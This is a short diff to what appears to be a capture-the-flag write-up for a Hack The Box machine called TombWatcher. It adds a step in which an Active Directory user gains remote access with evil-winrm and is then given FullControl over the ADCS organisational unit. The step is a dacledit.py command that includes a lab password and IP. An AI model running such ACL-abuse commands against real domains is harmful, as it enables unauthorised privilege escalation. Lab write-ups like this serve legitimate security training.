@@ -63,7 +63,9 @@
 11. John can PSRemote into the machine, so with evil-winrm we gain access to the box and get the user flag!
 
 12. From here, John has GenericAll privileges on the Certificate Services, ADCS, so give John FullControl of ADCS.
+`dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Password123' -dc-ip 10.129.32.88`
+
 ![image](https://github.com/user-attachments/assets/b35acffb-19d6-4dcc-9fc6-a9ca3e13c40b)
 
-
+13. 
 
